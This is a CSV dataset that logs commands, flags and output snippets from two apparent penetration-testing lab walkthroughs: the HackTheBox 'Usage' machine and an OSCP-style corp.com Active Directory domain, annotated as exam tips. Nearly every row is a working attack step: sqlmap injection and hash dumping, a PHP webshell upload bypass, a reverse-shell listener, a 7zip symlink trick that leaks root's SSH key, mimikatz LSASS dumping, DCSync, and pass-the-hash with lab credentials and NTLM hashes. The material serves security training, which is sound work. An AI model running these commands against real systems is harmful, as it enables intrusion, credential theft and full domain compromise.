"writeup_id","command_id","phase","step_number","context","command_executed","success","notes","flags_used","output_snippet","url_visited"
"htb-usage","nmap-quick-scan","enumeration","1","Initial TCP port discovery using fast scan with variable port assignment pattern","ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.18 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)","True","Common OSCP pattern: save open ports to variable for detailed scan. The port filtering with grep/cut/tr/sed is standard methodology.","{}","22/tcp open
80/tcp open",""
"htb-usage","nmap-service-scan","enumeration","2","Detailed service and version enumeration on discovered ports","nmap -p$ports -sC -sV 10.10.11.18","True","Redirect to usage.htb reveals virtual host requirement","{'-sC': 'Default NSE scripts for service enumeration', '-sV': 'Version detection for accurate service identification'}","22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/",""
"htb-usage","hosts-file-add-entry","enumeration","3","Add primary virtual host to resolve domain","echo 10.10.11.18  usage.htb | sudo tee -a /etc/hosts","True","","{}","",""
"htb-usage","web-manual-enumeration","enumeration","4","Manual browsing reveals admin panel link redirecting to admin.usage.htb subdomain","","True","","{}","","http://usage.htb/"
"htb-usage","hosts-file-add-entry","enumeration","5","Add admin subdomain after discovery","echo 10.10.11.18  admin.usage.htb | sudo tee -a /etc/hosts","True","","{}","",""
"htb-usage","user-registration-test","enumeration","6","Register test account to explore authenticated functionality","","True","Post-authentication shows limited blog page - not primary attack vector","{}","","http://usage.htb/registration"
"htb-usage","sqli-manual-test","foothold","1","Initial SQL injection detection using single quote in email parameter","","True","Application returned 'Password reset link sent' for malicious payload, confirming injection. This differs from invalid email response.","{}","",""
"htb-usage","burpsuite-intercept-request","foothold","2","Capture POST request for sqlmap automation","","True","Saved full POST request including cookies (XSRF-TOKEN and laravel_session) required for authentication context","{}","",""
"htb-usage","sqlmap-from-request","foothold","3","Initial sqlmap scan with default settings","sqlmap -r reset.req -p email --batch","False","DEFAULT LEVEL INSUFFICIENT - this is critical OSCP learning point. Sqlmap suggestion to increase --level was key to success.","{'-r': 'Read request from file', '-p': 'Test specific parameter (email)', '--batch': 'Never ask for user input, use default behavior'}","",""
"htb-usage","sqlmap-from-request-level3","foothold","4","Retry sqlmap with increased test depth (--level 3)","sqlmap -r reset.req -p email --batch --level 3","True","Success! --level 3 enables more thorough injection tests. OSCP LESSON: Trust manual verification over tool defaults.","{'--level': '3 (performs more extensive tests, required for blind SQLi detection)'}","[INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable
[INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'",""
"htb-usage","sqlmap-enumerate-databases","foothold","5","List all databases after confirming injection","sqlmap -r reset.req -p email --batch --level 3 --dbs","True","usage_blog is non-default database - primary target","{}","available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog",""
"htb-usage","sqlmap-enumerate-tables","foothold","6","Enumerate tables in usage_blog database","sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10","True","admin_users table is high-value target for credential extraction","{'-D': 'Target database name', '--tables': 'Enumerate tables', '--threads': '10 (parallel requests for faster enumeration)'}","Database: usage_blog
[15 tables]
admin_users (TARGET)
password_reset_tokens
users
...",""
"htb-usage","sqlmap-dump-table","foothold","7","Extract admin_users table contents","sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump","True","Bcrypt hash extracted - proceed to offline cracking","{'-T': 'Target table name', '--dump': 'Dump table contents'}","",""
"htb-usage","john-crack-bcrypt","foothold","8","Crack bcrypt hash using john with rockyou wordlist","john hash --wordlist=/usr/share/wordlists/rockyou.txt","True","Weak password cracked quickly. OSCP TIP: Always try rockyou first before custom wordlists.","{}","whatever1        (?)
1g 0:00:00:08 DONE (2024-08-07 05:56) 0.1123g/s 182.0p/s",""
"htb-usage","web-login-admin-panel","foothold","9","Authenticate to admin panel with cracked credentials","","True","Access granted to Laravel-admin dashboard","{}","",""
"htb-usage","web-version-enumeration","foothold","10","Enumerate software versions from admin dashboard","","True","Laravel-admin 1.8.18 vulnerable to CVE-2023-24249 (arbitrary file upload)","{}","",""
"htb-usage","create-php-webshell","foothold","11","Create simple PHP command execution webshell","echo '<?php system($_GET[""melo""]); ?>' > shell.php","True","GET parameter 'melo' used for command execution. Minimal webshell for initial RCE.","{}","",""
"htb-usage","file-rename-extension","foothold","12","Bypass upload filter by renaming to .jpg","mv shell.php shell.jpg","True","Client-side filename check bypassed with image extension","{}","",""
"htb-usage","burpsuite-modify-upload","foothold","13","Intercept upload request and modify filename to double extension","","True","CRITICAL: Server processes .php extension despite .jpg prefix. This is CVE-2023-24249 exploitation technique.","{}","",""
"htb-usage","web-access-uploaded-file","foothold","14","Access uploaded webshell directly via browser","","True","RCE achieved as dash user! Webshell functional.","{}","",""
"htb-usage","revshells-payload-generate","foothold","15","Generate base64-encoded bash reverse shell payload","","True","Base64 encoding avoids special character issues in web shells","{}","",""
"htb-usage","nc-listener","foothold","16","Start netcat listener for reverse shell callback","nc -nlvp 4444","True","","{}","",""
"htb-usage","webshell-execute-revshell","foothold","17","Trigger reverse shell via webshell","","True","Browser automatically URL-encodes payload. Instant callback received.","{}","",""
"htb-usage","pty-spawn-script","foothold","18","Stabilize shell with PTY using script command","script /dev/null -c bash","True","Interactive shell achieved. Can now use arrow keys, tab completion, etc.","{}","",""
"htb-usage","capture-user-flag","foothold","19","Retrieve user flag from dash home directory","","True","","{}","",""
"htb-usage","linux-enumerate-home-directory","lateral_movement","1","List all files including hidden configs in dash home","ls -al /home/dash","True","Hidden .monitrc file stands out - config files often contain credentials","{}","",""
"htb-usage","cat-read-file","lateral_movement","2","Read monit configuration file","cat /home/dash/.monitrc","True","Plaintext password in config - test for reuse across users","{}","",""
"htb-usage","linux-enumerate-users","lateral_movement","3","List system users to identify potential reuse targets","ls -al /home","True","","{}","",""
"htb-usage","su-user-switch","lateral_movement","4","Attempt password reuse for xander user","su xander","True","PASSWORD REUSE SUCCESS! Classic OSCP pattern.","{}","",""
"htb-usage","ssh-connect-password","lateral_movement","5","Establish stable SSH session as xander","ssh xander@usage.htb","True","More stable shell than reverse shell - preferred for privilege escalation enumeration","{}","",""
"htb-usage","check-sudo-privs","privilege_escalation","1","Enumerate sudo privileges for xander user","sudo -l","True","Custom binary with NOPASSWD sudo - HIGH PRIORITY target for analysis","{}","User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management",""
"htb-usage","file-identify-type","privilege_escalation","2","Identify binary type and properties","file /usr/bin/usage_management","True","Not stripped = symbols present, easier to analyze. Dynamically linked = uses system libraries.","{}","",""
"htb-usage","binary-dynamic-analysis","privilege_escalation","3","Run binary to observe behavior","sudo /usr/bin/usage_management","True","Option 1 triggers 7zip backup creation in /var/backups/project.zip","{}","",""
"htb-usage","strings-binary-analysis","privilege_escalation","4","Static analysis to reveal hardcoded commands","strings /usr/bin/usage_management","True","VULNERABILITY: chdir to /var/www/html + wildcard * + -snl flag = potential symlink abuse","{}","",""
"htb-usage","linux-check-directory-permissions","privilege_escalation","5","Verify write permissions on source directory","ls -ld /var/www/html","True","WRITABLE by xander! Can create files and symlinks in backup source directory.","{}","",""
"htb-usage","7zip-listfile-research","privilege_escalation","6","Research 7zip @listfile feature and -snl flag interaction","","True","Despite -snl (store symlink as link), @listfile feature reads symlink target content during processing","{}","",""
"htb-usage","cd-change-directory","privilege_escalation","7","Navigate to /var/www/html for exploitation","cd /var/www/html","True","","{}","",""
"htb-usage","touch-file","privilege_escalation","8","Create @id_rsa listfile marker","touch @id_rsa","True","@ prefix is special to 7zip - treats id_rsa as listfile instead of regular file","{}","",""
"htb-usage","ln-symbolic","privilege_escalation","9","Create symlink to root's SSH private key","ln -s /root/.ssh/id_rsa id_rsa","True","Symlink points to target we want to read (root SSH key)","{}","",""
"htb-usage","sudo-execute-usage-management","privilege_escalation","10","Trigger 7zip backup with symlink exploitation","sudo /usr/bin/usage_management","True","SUCCESS! 7zip output contains root SSH key content. The 'No more files' errors indicate 7zip tried to interpret key content as filenames (expected behavior).","{}","-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
...
-----END OPENSSH PRIVATE KEY----- : No more files",""
"htb-usage","extract-ssh-key","privilege_escalation","11","Copy SSH key from 7zip output to local file","","True","CRITICAL: Each line has trailing ': No more files' that must be removed for valid key format","{}","",""
"htb-usage","ssh-key-format","privilege_escalation","12","Format extracted key properly","","True","","{}","",""
"htb-usage","chmod-numeric-permissions","privilege_escalation","13","Set correct SSH key permissions","chmod 600 root_id_rsa","True","SSH requires 600 permissions for private keys","{}","",""
"htb-usage","ssh-key-authentication","privilege_escalation","14","Authenticate as root using stolen SSH key","ssh -i root_id_rsa root@usage.htb","True","ROOT ACCESS ACHIEVED!","{}","",""
"htb-usage","capture-root-flag","privilege_escalation","15","Retrieve root flag as proof of complete system compromise","","True","","{}","",""
"oscp-corp-dcsync","crackmapexec-smb-users","enumeration","1","Enumerate all domain user accounts from DC1 to identify potential targets and privileged accounts (Domain Admins)","crackmapexec smb 192.168.223.70 -u pete -p 'Nexus123!' --users","True","Critical first step - identifying privileged accounts (maria) guides entire attack strategy. adminCount=1 indicates privileged user status.","{}","",""
"oscp-corp-dcsync","crackmapexec-smb-pass-pol","enumeration","2","Retrieve domain password policy to safely conduct password spray attacks without triggering account lockouts","crackmapexec smb 192.168.223.70 -u pete -p 'Nexus123!' --pass-pol","True","CRITICAL for OSCP exam - always check lockout policy before password attacks. 5-attempt threshold allows limited spray attempts.","{}","",""
"oscp-corp-dcsync","crackmapexec-smb-enum-shares","enumeration","3","Enumerate SMB shares on DC1 and discovered hosts to identify potential credential/data repositories","crackmapexec smb 192.168.223.70-80 -u pete -p 'Nexus123!' --shares","True","Host discovery reveals lateral movement targets. CLIENT75 becomes critical after BloodHound analysis shows mike's AdminTo relationship.","{}","",""
"oscp-corp-dcsync","bloodhound-python-collect","foothold","4","Remotely collect BloodHound data from Kali using pete's credentials without executing code on Windows targets","bloodhound-python -u pete -p 'Nexus123!' -d corp.com -ns 192.168.223.70 -c All --zip","True","bloodhound-python advantages: No Windows code execution required, runs from Kali, OSCP-approved. Disadvantage: Doesn't collect local admin sessions (uses LDAP only). SharpHound.exe collects more complete data but requires Windows execution.","{}","",""
"oscp-corp-dcsync","bloodhound-upload-data","foothold","5","Import collected BloodHound ZIP into Neo4j database for graph analysis via BloodHound GUI","bloodhound (GUI: Upload Data → select bh.zip)","True","CRITICAL STEP: Clear old BloodHound data before uploading new domain (Database Info → Clear Database). Cross-contamination from previous labs causes confusion and wrong attack paths.","{}","",""
"oscp-corp-dcsync","bloodhound-analyze-paths","foothold","6","Execute pre-built query 'Shortest Paths to Domain Admins' from pete to discover privilege escalation path","BloodHound GUI: Search 'pete@corp.com' → Mark as Owned → Analysis → 'Shortest Paths to Domain Admins from Owned Principals'","False","Initial query failure is COMMON and EXPECTED. Doesn't mean no path exists - means need lateral movement first. Try alternative queries: 'Find Workstations where Domain Users can RDP', 'Find Computers where Domain Users are Local Admin'.","{}","",""
"oscp-corp-dcsync","bloodhound-cypher-query","foothold","7","Execute custom Cypher query to find computers where mike (another compromised account) has local admin privileges","MATCH (u:User {name:'MIKE@CORP.COM'})-[:AdminTo]->(c:Computer) RETURN u,c","True","CRITICAL DISCOVERY: Custom Cypher queries reveal paths pre-built queries miss. OSCP TIP: Test multiple users found during enumeration (pete, mike, dave) for AdminTo relationships. One may have lateral movement capability.","{}","",""
"oscp-corp-dcsync","bloodhound-cypher-query","foothold","8","Verify if CLIENT75 has any active sessions from privileged users (Domain Admins) that can be harvested","MATCH (c:Computer {name:'CLIENT75.CORP.COM'})<-[:HasSession]-(u:User) RETURN c,u","True","GOLDMINE DISCOVERY: Service sessions (Session type: Service from 0) persist until reboot. Maria's Domain Admin credentials are cached in CLIENT75 LSASS memory. Local admin (mike) can dump these credentials with mimikatz. This is the CRITICAL path to Domain Admin.","{}","",""
"oscp-corp-dcsync","evil-winrm-connect","lateral_movement","9","Connect to CLIENT75 with mike's credentials using domain\username syntax for domain authentication","evil-winrm -i 192.168.223.75 -u 'corp.com\mike' -p 'Darkness1099!'","True","Evil-WinRM syntax: Domain authentication requires 'domain\user' format (NOT -d flag - doesn't exist). Alternative syntax: -u mike -r corp.com (realm flag for Kerberos). Evil-WinRM advantages over PSExec: No service creation (stealthier), interactive PowerShell, built-in file upload/download.","{}","",""
"oscp-corp-dcsync","evil-winrm-upload-file","lateral_movement","10","Upload mimikatz binary from Kali to CLIENT75 for credential dumping in next phase","upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe","True","Evil-WinRM 'upload' command syntax: upload <local_file> [remote_name]. Default destination: current directory. OSCP TIP: Navigate to writable directory first (C:\temp, C:\Users\Public) to avoid AV detection in user profile. Alternative: Certutil download from Kali HTTP server.","{}","",""
"oscp-corp-dcsync","mimikatz-privilege-debug","privilege_escalation","11","Enable SeDebugPrivilege to allow current process (mimikatz) to access LSASS memory for credential extraction",".\mimikatz.exe ""privilege::debug"" ""exit""","True","CRITICAL PREREQUISITE: privilege::debug MUST succeed before sekurlsa commands. 'Privilege 20' = SeDebugPrivilege. Failure ('ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061') indicates insufficient privileges - verify local admin with 'whoami /groups'.","{}","",""
"oscp-corp-dcsync","mimikatz-sekurlsa-logonpasswords","privilege_escalation","12","Extract all cached credentials (plaintext passwords, NTLM hashes, Kerberos tickets) from LSASS memory for privilege escalation",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > logonpasswords.txt","True","GOLDMINE: maria's Session type 'Service from 0' confirms scheduled task/service running as Domain Admin. Service sessions persist until reboot - reliable target. dave's plaintext password extracted (WDigest enabled or stored in memory). OSCP EXAM: ALWAYS dump credentials on every compromised admin-level system - may find cached DA credentials.","{}","",""
"oscp-corp-dcsync","evil-winrm-download-file","privilege_escalation","13","Download mimikatz output from CLIENT75 to Kali for offline analysis, documentation, and exam reporting","download logonpasswords.txt","True","EXAM CRITICAL: Download ALL valuable data immediately (credentials, flags, screenshots). Don't rely on maintaining access - machines may become unstable or connections may drop. Organize loot: mkdir /home/kali/exam/<TARGET>/loot before attacking.","{}","",""
"oscp-corp-dcsync","ad-dcsync-secretsdump-user","post_exploitation","14","Execute DCSync attack using maria's NTLM hash to replicate domain credential database and extract all user NTLM hashes","impacket-secretsdump -hashes :2a944a58d4ffa77137b2c587e6ed7626 corp.com/maria@192.168.223.70 -just-dc-ntlm","True","CRITICAL SUCCESS: Administrator hash extracted: 4adb23d0a33907193029f55a8a9ba303. krbtgt hash also obtained for Golden Ticket attacks (persistence). DCSync advantages: (1) No code execution on DC needed, (2) Fast (seconds vs. hours for NTDS.dit exfiltration), (3) All hashes dumped at once. OSCP EXAM: If you have Domain Admin, ALWAYS try DCSync first (fastest full domain compromise).","{}","",""
"oscp-corp-dcsync","evil-winrm-pth-connect","post_exploitation","15","Authenticate to DC1 as Administrator using Pass-the-Hash with NTLM hash from DCSync output","evil-winrm -i 192.168.223.70 -u Administrator -H 4adb23d0a33907193029f55a8a9ba303","True","Pass-the-Hash with Evil-WinRM: -H flag (capital H, just NTLM hash, no LM hash needed). Alternative: impacket-psexec -hashes :NTLM Administrator@DC_IP (note lowercase -hashes with colon prefix). OSCP EXAM: Pass-the-Hash is FASTER than password cracking - hashcat on NTLM can take hours/days, PtH is instant.","{}","",""
"oscp-corp-dcsync","windows-read-file-type","post_exploitation","16","Read flag from Administrator's desktop on DC1 to complete domain compromise objective","type C:\Users\Administrator\Desktop\flag.txt","True","EXAM CRITICAL: (1) ALWAYS verify flag format before disconnecting (MD5=32 chars, SHA1=40 chars), (2) Screenshot flag retrieval with full command visible (type C:\...\flag.txt), (3) Copy flag to clipboard for submission, (4) Document timestamp for report. Alternative: Get-Content C:\Users\Administrator\Desktop\flag.txt | Out-File C:\temp\flag.txt (save copy).","{}","",""
